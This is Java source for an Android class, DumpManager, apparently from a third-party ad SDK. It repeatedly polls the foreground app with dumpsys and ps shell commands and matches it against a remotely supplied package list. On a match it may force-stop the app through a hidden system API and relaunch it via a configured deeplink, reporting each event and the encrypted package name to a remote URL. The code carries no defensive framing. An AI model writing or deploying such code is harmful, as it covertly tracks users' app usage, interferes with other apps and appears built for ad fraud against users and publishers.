package com.kkwinter.thirdsdk.dmp;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;

import com.kkwinter.sdkshell.core.ProductConfig;
import com.kkwinter.utils.CTLog;
import com.kkwinter.utils.aes.RijindaelUtils;
import com.kkwinter.utils.config.Const;
import com.kkwinter.utils.net.TrackLogUtils;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class DumpManager {
    private static final String TAG = "DumpManager";
    private static final int MSG_CHECK_TOP_ACTIVITY = 0;

    private Context context;
    private Map<String, String> dumpMap = new HashMap<>();      //pkg-linkUrl
    private Map<String, String> pidMap = new HashMap<>();       //pkg-pid
    private Map<String, Boolean> sdkStartMap = new HashMap<>(); //pkg-sdkStart
    private Map<String, Boolean> emptyPidMap = new HashMap<>(); //pkg-emptyPid
    private long duration;     //单位：秒
    private String reportUrl;  //上报日志地址
    private boolean forceStop; //是否强制关闭

    private Handler handler = new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            if (msg.what == MSG_CHECK_TOP_ACTIVITY) {
                checkAndLaunchHitApp(msg);
            }
        }
    };

    @SuppressLint("StaticFieldLeak")
    private static DumpManager dumpManager = null;

    public static DumpManager getInstance(Context context) {
        if (dumpManager == null) {
            synchronized (DumpManager.class) {
                if (dumpManager == null) {
                    dumpManager = new DumpManager(context);
                }
            }
        }
        return dumpManager;
    }

    private DumpManager(Context context) {
        this.context = context;
    }

    protected void startDump(ProductConfig.Dumpsys dumpsys) {
        dumpMap.putAll(dumpsys.dumpMap);
        duration = dumpsys.duration;
        reportUrl = dumpsys.report;
        forceStop = dumpsys.forceStop;

        if (handler.hasMessages(MSG_CHECK_TOP_ACTIVITY)) {
            handler.removeMessages(MSG_CHECK_TOP_ACTIVITY);
        }

        startCheckTopActivity(CheckNode.INITSTART);
    }

    /**
     * 开启轮询检测
     */
    private void startCheckTopActivity(CheckNode checkNode) {
        CTLog.i(TAG, "start check topActivity: " + checkNode.name());

        Message msg = new Message();
        msg.obj = checkNode;
        msg.what = MSG_CHECK_TOP_ACTIVITY;
        long delay = checkNode == CheckNode.INITSTART ? 0L : duration * 1000;
        handler.sendMessageDelayed(msg, delay);
    }

    /**
     * 轮询检测功能实现
     */
    private void checkAndLaunchHitApp(Message msg) {
        CheckNode checkNode = (CheckNode) msg.obj;

        String topActivity = "dumpsys activity | grep \"mFocusedActivity\"";
        ShellUtils.CommandResult result = ShellUtils.execCommand(topActivity, false);
        String successMsg = result.successMsg;
        String errorMsg = result.errorMsg;
        CTLog.i(TAG, "dumpsys successMsg: >>" + successMsg);
        CTLog.i(TAG, "dumpsys errorMsg: >>" + errorMsg);

        if (TextUtils.isEmpty(successMsg) || !TextUtils.isEmpty(errorMsg)) {
            sendReport(null, DmpEventType.DUMPFAILED);
            return;
        }

        String packageName = getPackageName(result.successMsg);
        CTLog.i(TAG, "packageName: " + packageName);

        if (!TextUtils.isEmpty(packageName) && checkNode == CheckNode.INITSTART) {
            sendReport(packageName, DmpEventType.DUMPSUCCESS);
        }

        //检查是否命中
        if (!TextUtils.isEmpty(packageName) && dumpMap.containsKey(packageName)) {
            //获取pid
            String currentPid = getProcessPid(packageName);
            CTLog.i(TAG, "currentPid: " + currentPid);

            //拿不到pid，直接发deeplink, 发一次
            if (TextUtils.isEmpty(currentPid)) {
                Boolean isEmptyPidHasSend = emptyPidMap.get(packageName);
                if (isEmptyPidHasSend == null || !isEmptyPidHasSend) {
                    sendReport(packageName, DmpEventType.MATCH);
                    openDeepLink(context, packageName, "emptyPid");
                }
                startCheckTopActivity(CheckNode.EMPTYPID);
                return;
            }

            //sdk调起的话，不需要再次调起
            Boolean isSdkStart = sdkStartMap.get(packageName);
            if (isSdkStart != null && isSdkStart) {
                pidMap.put(packageName, currentPid);
                sdkStartMap.put(packageName, false);
                startCheckTopActivity(CheckNode.SDKSTART);
                return;
            }

            //通过pid匹配检查是否已经做过操作
            if (currentPid.equals(pidMap.get(packageName))) {
                startCheckTopActivity(CheckNode.SAMPLEPID);
                return;
            }

            try {
                sendReport(packageName, DmpEventType.MATCH);

                if (forceStop) {
                    //强制关闭
                    ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                    Method method = Class.forName("android.app.ActivityManager").getMethod("forceStopPackage", String.class);
                    method.invoke(am, packageName);
                }

                //通过deeplink开启
                openDeepLink(context, packageName, "match");

            } catch (Exception e) {
                CTLog.printStackTrace(e);
            }
        }

        //再次发送检测
        startCheckTopActivity(CheckNode.RESTART);
    }

    /**
     * 获取packagename
     *
     * @param successMsg 字符串
     * @return pkg
     */
    private String getPackageName(String successMsg) {
        String parentStr = successMsg.substring(successMsg.indexOf("{") + 1, successMsg.indexOf("}"));

        String[] strs = parentStr.split(" ");
        List<String> strList = new ArrayList<>();
        for (String str : strs) {
            if (!TextUtils.isEmpty(str)) {
                strList.add(str);
            }
        }

        String mainActivityPath = null;
        if (strList.size() > 3) {
            mainActivityPath = strList.get(2);
        }

        String packageName = null;
        if (!TextUtils.isEmpty(mainActivityPath)) {
            packageName = mainActivityPath.substring(0, mainActivityPath.indexOf("/"));
        }

        return packageName;
    }


    /**
     * 获取pid
     *
     * @param packageName pkg
     * @return pid
     */
    private String getProcessPid(String packageName) {
        String processInfo = "ps | grep " + packageName + " | grep -v " + packageName + ":";
        ShellUtils.CommandResult psResult = ShellUtils.execCommand(processInfo, false);
        String successMsg = psResult.successMsg;
        String errorMsg = psResult.errorMsg;
        CTLog.i(TAG, "ps successMsg: " + successMsg);
        CTLog.i(TAG, "ps errorMsg: " + errorMsg);

        String[] strs = psResult.successMsg.split(" ");
        List<String> strList = new ArrayList<>();
        for (String string : strs) {
            if (!TextUtils.isEmpty(string)) {
                strList.add(string);
            }
        }

        int length = strList.size();
        if (length > 2 && strList.get(length - 1).equals(packageName)) {
            return strList.get(1);
        }

        return null;
    }

    /**
     * DeepLink方式打开
     *
     * @param context     context
     * @param packageName packageName
     */
    private void openDeepLink(Context context, String packageName, String from) {
        String deepLinkUrl = dumpMap.get(packageName);
        Intent it = new Intent(Intent.ACTION_VIEW, Uri.parse(deepLinkUrl));
        it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ComponentName componentName = it.resolveActivity(context.getPackageManager());
        if (componentName != null) {    //已经安装该应用
            context.startActivity(it);
            sendReport(packageName, DmpEventType.REBOOST);
            if ("emptyPid".equals(from)) {
                emptyPidMap.put(packageName, true);
            }
            if ("match".equals(from)) {
                sdkStartMap.put(packageName, true);
            }
        }
    }

    /**
     * 发送事件节点日志
     */
    private void sendReport(String packageName, DmpEventType dmpEventType) {
        CTLog.i(TAG, "DmpEventType, name: " + dmpEventType.name() + " index: " + dmpEventType.getIndex());
        if (TextUtils.isEmpty(reportUrl)) return;

        String finalReportUrl;
        if (reportUrl.contains("?")) {
            finalReportUrl = reportUrl + "&event=" + dmpEventType.getIndex();
        } else {
            finalReportUrl = reportUrl + "?event=" + dmpEventType.getIndex();
        }

        if (!TextUtils.isEmpty(packageName)) {
            finalReportUrl = finalReportUrl + "&spn=" + RijindaelUtils.encrypt(packageName, Const.commonPwd);
        }
        TrackLogUtils.sendTrackUrl(context, finalReportUrl);
    }

    enum DmpEventType {
        DUMPSUCCESS(0),
        MATCH(1),
        REBOOST(2),
        DUMPFAILED(3);

        private int index;

        DmpEventType(int index) {
            this.index = index;
        }

        private int getIndex() {
            return index;
        }
    }

    enum CheckNode {
        INITSTART,
        EMPTYPID,
        SDKSTART,
        SAMPLEPID,
        RESTART
    }

}
